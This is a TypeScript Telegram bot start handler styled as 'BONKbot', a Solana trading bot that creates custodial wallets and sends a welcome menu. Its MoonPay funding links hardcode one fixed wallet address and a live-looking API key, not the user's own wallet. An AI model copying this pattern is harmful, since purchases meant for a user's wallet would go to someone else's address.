import User from '../models/User';
import { Keypair } from '@solana/web3.js';
import dbConnect from '../../mongodb';
import { Context } from 'telegraf';
import { createWallet } from '../utils/solana';

export default async function start(ctx: Context) {
  const userId = ctx.from?.id;

  await dbConnect();
  const user = await User.findOne({ telegramId: userId });
  let publicKey = user?.publicKey;
  if (!user) {
    publicKey = await createWallet(userId!)
  }
  const msg = `Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!

You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:

<code>${publicKey}</code> (tap to copy)

Or buy SOL with Apple / Google Pay via MoonPay <a href="https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=7H12vyN271bussh4rLcPnz7Ju7KGwo911otFRWT9cY7a&showWalletAddressForm=true&currencyCode=sol&signature=BInyyFGDmMuYziQgn9S2OCQzHxexvZtSExiufbATXVY%3D">here</a> .

Once done, tap refresh and your balance will appear here.

To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener or Meteora.

For more info on your wallet and to export your seed phrase, tap "Wallet" below.`;

  ctx.telegram.sendMessage(ctx.chat?.id!, msg, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: 'Buy', callback_data: 'buy' },
          { text: 'Fund', url: 'https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=7H12vyN271bussh4rLcPnz7Ju7KGwo911otFRWT9cY7a&showWalletAddressForm=true&currencyCode=sol&signature=BInyyFGDmMuYziQgn9S2OCQzHxexvZtSExiufbATXVY%3D' },
        ],
        [
          { text: 'Help', callback_data: 'help' },
          { text: 'Refer Friend', callback_data: 'refer' },
          { text: 'Alerts', url: 'https://t.me/Bonk' },
        ],
        [
          { text: 'Wallet', callback_data: 'wallet' },
          { text: 'Settings', callback_data: 'settings' },
        ],
        [
          { text: 'DCA Orders', callback_data: 'DCAOrders' },
          { text: 'Limit Orders', callback_data: 'limitOrders' },
        ],
        [
          { text: 'Pin', callback_data: 'pin' },
          { text: 'Refresh', callback_data: 'refresh' },
        ],
      ],
    },
  });
}
